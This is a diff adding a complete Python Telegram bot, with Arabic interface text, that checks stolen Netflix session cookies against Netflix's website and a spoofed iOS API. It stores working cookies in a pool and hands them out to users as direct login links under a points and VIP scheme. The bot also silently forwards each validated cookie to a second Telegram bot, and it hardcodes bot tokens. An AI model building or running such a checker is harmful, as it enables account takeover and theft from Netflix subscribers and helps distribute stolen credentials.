@@ -1,0 +1,386 @@
+import io
+import json
+import os
+import random
+import re
+import shutil
+import threading
+import time
+import urllib.parse
+from datetime import datetime
+import pyzipper
+import requests
+import telebot
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
+from urllib3.exceptions import InsecureRequestWarning
+
+# --- إعدادات البوت والتوكن ---
+TOKEN = '8851532245:AAFegc2ZANrty8QFduPN46DnMEvVDWJ6HEw'
+SECOND_BOT_TOKEN = '8707444944:AAG7and69AeETb53MW4eCiXnfuc7hs_ci5E'
+TARGET_CHAT_ID = "8713916851"
+
+bot = telebot.TeleBot(TOKEN)
+
+try:
+    bot.remove_webhook()
+except Exception:
+    pass
+
+DEVELOPER_CHAT_ID = 8713916851
+DEVELOPER_USERNAME = "farxxes" 
+CHANNEL_LINK = "https://t.me/farxxess"
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+BASE_TEMP_DIR = "final_output_temp"
+if not os.path.exists(BASE_TEMP_DIR):
+    os.makedirs(BASE_TEMP_DIR)
+
+VALID_COOKIES_POOL = []      
+USED_COOKIES_HISTORY = set() 
+USER_DATABASE = {}           
+BANNED_USERS = set()         
+active_scans = {}            
+PROXIES_POOL = []  
+MAINTENANCE_MODE = False  
+
+API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+QUERY_PARAMS = {
+    "appVersion": "15.48.1",
+    "device_type": "NFAPPL-02-",
+    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "idiom": "phone",
+    "iosVersion": "15.8.5",
+    "modelType": "IPHONE8-1",
+    "path": '["account","token","default"]',
+    "pathFormat": "graph",
+    "responseFormat": "json",
+}
+
+BASE_HEADERS = {
+    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "x-netflix.client.appversion": "15.48.1",
+    "accept-language": "en-US;q=1",
+}
+
+def safe_send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
+    try:
+        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
+    except Exception:
+        pass
+
+def send_cookie_to_external_bot(cookie_string):
+    url = f"https://api.telegram.org/bot{SECOND_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TARGET_CHAT_ID,
+        "text": f"✅ **حساب تم التأكد من عمله (تم استخراجه من بوت فارس):**\n\n`{cookie_string}`",
+        "parse_mode": "Markdown"
+    }
+    try:
+        requests.post(url, data=payload)
+    except Exception:
+        pass
+
+def check_ban(func):
+    def wrapper(message, *args, **kwargs):
+        try:
+            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
+        except Exception:
+            chat_id = message.message.chat.id
+        if chat_id in BANNED_USERS:
+            bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
+            return
+        if MAINTENANCE_MODE and chat_id != DEVELOPER_CHAT_ID:
+            bot.send_message(chat_id, "⚠️ **البوت في وضع الصيانة المؤقتة حالياً!**")
+            return
+        return func(message, *args, **kwargs)
+    return wrapper
+
+def extract_clean_netflix_ids(text):
+    cleaned_ids = []
+    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
+    for val in netscape_matches:
+        decoded = urllib.parse.unquote(val) if "%" in val else val
+        if decoded not in cleaned_ids and len(decoded) > 20:
+            cleaned_ids.append(decoded)
+            
+    standard_matches = re.findall(r"NetflixId=([^;\s\n`\"]+)", text)
+    for val in standard_matches:
+        decoded = urllib.parse.unquote(val) if "%" in val else val
+        if decoded not in cleaned_ids and len(decoded) > 20:
+            cleaned_ids.append(decoded)
+    return cleaned_ids
+
+def check_netflix_cookie_detailed(netflix_id):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cookie": f"NetflixId={netflix_id}"
+    }
+
+    dead_keywords = [
+        "restart your membership", "restart membership", "rejoin netflix", 
+        "reinicia tu membresía", "réactivez votre abonnement", "rejoindre netflix",
+        "جدد اشتراكك", "إعادة تفعيل العضوية", "استئناف العضوية",
+        "üyeliğinizi yeniden başlatın", "netflix'e tekrar katılın",
+        "mitgliedschaft reaktivieren", "netflix wiedereröffnen",
+        "choose your plan", "elige tu plan", "choisissez votre forfait", "اختر خطتك",
+        "mulai lagi keanggotaanmu"
+    ]
+    
+    try:
+        check_url = "https://www.netflix.com/YourAccount"
+        full_response = requests.get(check_url, headers=headers, timeout=4, allow_redirects=True, verify=False)
+        html_content = full_response.text
+        html_content_lower = html_content.lower()
+        final_url = full_response.url.lower()
+    except Exception:
+        return None
+    
+    if any(path in final_url for path in ["/login", "/signup", "/simplesignup", "/youraccount/cancel", "/twp", "nmhp"]):
+        return None
+
+    if any(kw in html_content_lower for kw in dead_keywords):
+        return None
+
+    account_details = {
+        "email": "Unknown ✉️",
+        "plan": "Basic SD 📱",
+        "next_billing": "Unknown 📅",
+        "country": "Global 🌐",
+        "payment_method": "Unknown 💳",
+        "profiles": "Unknown 👥",
+        "membership_status": "ACTIVE",
+        "bypass": True
+    }
+
+    try:
+        script_match = re.search(r'netflix\.reactContext\s*=\s*({.*?});', html_content)
+        if not script_match:
+            script_match = re.search(r'window\.__netflixContext\s*=\s*({.*?});', html_content)
+
+        if script_match:
+            context_data = json.loads(script_match.group(1))
+            models = context_data.get("models", {})
+            user_info = models.get("userInfo", {}).get("data", {})
+            if user_info.get("email"):
+                account_details["email"] = user_info.get("email")
+
+            membership_data = models.get("membershipState", {}).get("data", {})
+            plan_info = membership_data.get("planName", "").lower()
+            if "premium" in plan_info or "4k" in plan_info:
+                account_details["plan"] = "Premium 4K 💎"
+            elif "standard" in plan_info or "hd" in plan_info:
+                account_details["plan"] = "Standard HD 🎬"
+    except Exception:
+        pass
+
+    api_headers = dict(BASE_HEADERS)
+    api_headers["Cookie"] = f"NetflixId={netflix_id}"
+    
+    try:
+        api_res = requests.get(API_URL, params=QUERY_PARAMS, headers=api_headers, timeout=4, verify=False)
+        if api_res.status_code == 200:
+            data = api_res.json()
+            value_data = data.get("value", {})
+            membership_status = value_data.get("membershipStatus", "UNKNOWN").upper()
+            
+            if membership_status in ["FORMER_MEMBER", "NEEDS_RESTART", "CURRENT_MEMBER_STOPPED", "NEEDS_PAYMENT"]:
+                return None
+                
+            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
+            token = account_info.get("token")
+            expires = account_info.get("expires")
+            
+            if token:
+                account_details["bypass"] = False
+                account_details["country"] = value_data.get("countryOfRegistration", "Global 🌐")
+                current_plan_info = value_data.get("videoQuality", "").upper()
+                if "ULTRA" in current_plan_info or "4K" in current_plan_info:
+                    account_details["plan"] = "Premium 4K 💎"
+                elif "HIGH" in current_plan_info or "HD" in current_plan_info:
+                    account_details["plan"] = "Standard HD 🎬"
+                
+                expires_final = expires / 1000 if len(str(expires)) == 13 else expires
+                return {"token": token, "expires": int(expires_final), "details": account_details}
+    except Exception:
+        pass
+
+    return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "details": account_details}
+
+def generate_main_keyboard(user_id):
+    points = USER_DATABASE.get(user_id, {}).get("points", 5)
+    role = USER_DATABASE.get(user_id, {}).get("role", "MEMBER")
+    markup = InlineKeyboardMarkup()
+    markup.row_width = 1
+    
+    markup.add(InlineKeyboardButton("🔍 فحص (ملف/نص/رابط)", callback_data="menu_check"))
+    
+    if user_id == DEVELOPER_CHAT_ID:
+        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (صلاحية المطور ♾️)", callback_data="dispense_live_link"))
+    elif role == "VIP":
+        markup.add(InlineKeyboardButton("🎁 سحب رابط نتفلكس (وضع الـ VIP لا ينتهي 💎)", callback_data="dispense_live_link"))
+    elif points > 0:
+        markup.add(InlineKeyboardButton(f"🎁 سحب رابط نتفلكس (تكلفة: 1 نقطة) 🪙", callback_data="dispense_live_link"))
+    else:
+        markup.add(InlineKeyboardButton("📬 نفدت نقاطك! تواصل مع المطور فارس لشحن رصيدك 🫡", url=f"https://t.me/{DEVELOPER_USERNAME}"))
+        
+    markup.add(InlineKeyboardButton("📊 فحص المخزن والنقاط", callback_data="check_pool_status"))
+    
+    if user_id == DEVELOPER_CHAT_ID:
+        markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
+    return markup
+
+@bot.message_handler(commands=['start'])
+def start_command_handler(message):
+    chat_id = message.chat.id
+    if chat_id not in USER_DATABASE:
+        USER_DATABASE[chat_id] = {"points": 5, "username": message.from_user.username or "", "role": "MEMBER"}
+    bot.send_message(chat_id, f"👋 أهلاً بك يا {message.from_user.first_name} في بوت فحص وسحب حسابات نتفلكس الذكي! 🎬\n\nقم باختيار الخيار المناسب من القائمة بالأسفل:", reply_markup=generate_main_keyboard(chat_id))
+
+@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
+@check_ban
+def admin_panel_handler(call):
+    chat_id = call.message.chat.id
+    if chat_id != DEVELOPER_CHAT_ID:
+        bot.answer_callback_query(call.id, "❌ هذا الزر مخصص للمطور فارس فقط!", show_alert=True)
+        return
+    
+    bot.answer_callback_query(call.id)
+    markup = InlineKeyboardMarkup()
+    markup.row_width = 1
+    markup.add(
+        InlineKeyboardButton("🧹 تنظيف المخزن وحذف الحسابات التالفة", callback_data="admin_clean_pool"),
+        InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main")
+    )
+    bot.edit_message_text(f"👑 **لوحة تحكم المطور السريّة**\n\n📦 إجمالي الحسابات حالياً بالمخزن: `{len(VALID_COOKIES_POOL)}`", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin_clean_pool")
+@check_ban
+def admin_clean_pool_handler(call):
+    chat_id = call.message.chat.id
+    if chat_id != DEVELOPER_CHAT_ID:
+        return
+    
+    bot.answer_callback_query(call.id, "🧹 جاري فحص وتنظيف المخزن وحذف الحسابات غير الصالحة...", show_alert=True)
+    status_msg = bot.send_message(chat_id, "⏳ جاري فحص كل حسابات المخزن واحداً تلو الآخر لتصفيتها...")
+    
+    global VALID_COOKIES_POOL
+    valid_cleaned = []
+    removed_count = 0
+    
+    for cookie in list(VALID_COOKIES_POOL):
+        res = check_netflix_cookie_detailed(cookie)
+        if res:
+            valid_cleaned.append(cookie)
+        else:
+            removed_count += 1
+            
+    VALID_COOKIES_POOL = valid_cleaned
+    
+    bot.delete_message(chat_id, status_msg.message_id)
+    bot.send_message(chat_id, f"🧹 **تم تنظيف المخزن بنجاح يا فارس!**\n\n✅ الحسابات الشغالة المتبقية: `{len(VALID_COOKIES_POOL)}`\n❌ الحسابات التالفة التي تم حذفها: `{removed_count}`", reply_markup=generate_main_keyboard(chat_id), parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
+def back_to_main_handler(call):
+    chat_id = call.message.chat.id
+    bot.edit_message_text("👋 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
+
+@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
+@check_ban
+def dispense_account_on_button(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id, "⏳ جاري فحص وتصفية الحساب وسحب الملف...")
+    
+    # دالة تنفيذ السحب وتصفية التالف تلقائياً أثناء السحب
+    global VALID_COOKIES_POOL
+    response = None
+    
+    while VALID_COOKIES_POOL:
+        current_cookie = VALID_COOKIES_POOL.pop(0)
+        fresh_result = check_netflix_cookie_detailed(current_cookie)
+        
+        if fresh_result:
+            role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
+            if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
+                USER_DATABASE[chat_id]["points"] -= 1
+            
+            token = fresh_result["token"]
+            expires = fresh_result["expires"]
+            if isinstance(expires, int) and len(str(expires)) == 13: 
+                expires //= 1000
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+            
+            full_cookie_string = f"NetflixId={current_cookie}"
+            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
+            short_id = current_cookie[:20]
+            
+            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
+            success_text = (
+                f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
+                f"📊 باقة الحساب المستخرج: **{fresh_result['details']['plan']}**\n"
+                f"📍 بلد الحساب المستخرج: `{fresh_result['details']['country']}`\n"
+                f"📅 **تاريخ الفواتير القادم:** {date_str}\n"
+                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n\n"
+                f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}"
+            )
+            
+            user_markup = InlineKeyboardMarkup()
+            user_markup.row_width = 2
+            user_markup.add(
+                InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), 
+                InlineKeyboardButton("📺 تفعيل شاشة TV تلقائياً", callback_data=f"tv_act_{short_id}")
+            )
+            user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
+            user_markup.add(
+                InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), 
+                InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
+            )
+            
+            if current_cookie not in VALID_COOKIES_POOL:
+                VALID_COOKIES_POOL.append(current_cookie)
+                
+            response = {"status": "success", "text": success_text, "markup": user_markup}
+            break
+        else:
+            # الحساب تالف وتظهر فيه صفحة إعادة الاشتراك، تم حذفه تلقائياً من المخزن
+            continue
+
+    if not response:
+        response = {"status": "empty", "message": "❌ المخزن فارغ أو تم تنظيف جميع الحسابات التالفة! ارسل ملف كوكيز جديد لتعبئته."}
+
+    if response["status"] == "success":
+        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+    else:
+        bot.send_message(chat_id, response["message"])
+
+@bot.callback_query_handler(func=lambda call: call.data == "menu_check")
+def menu_check_button(call):
+    bot.edit_message_text("🔍 أرسل الملف (Txt/Zip) أو الكوكيز كنص الآن وسأفحصه فوراً بكافة لغات نتفلكس والـ API!", call.message.chat.id, call.message.message_id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
+@check_ban
+def pool_status(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id)
+    role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
+    points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 5)} نقطة 🪙")
+    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن السري:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{len(VALID_COOKIES_POOL)}** حساب جاهز بالكامل.", reply_markup=generate_main_keyboard(chat_id))
+
+@bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
+def ask_how_to_use(call):
+    bot.answer_callback_query(call.id)
+    guide = (
+        "💡 **طريقة استخدام حسابات نتفلكس:**\n\n"
+        "1️⃣ **للكمبيوتر:** اضغط على زر (💻 دخول للكمبيوتر) أو استعمل ملف الكوكيز.\n"
+        "2️⃣ **للهاتف:** استخدم رابط الدخول المباشر.\n"
+        "3️⃣ **للتلفزيون:** اضغط على (📺 تفعيل شاشة TV تلقائياً) واكتب الأرقام."
+    )
+    bot.send_message(call.message.chat.id, guide, parse_mode="Markdown")
+
+if __name__ == "__main__":
+    print("🤖 Bot is running...")
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
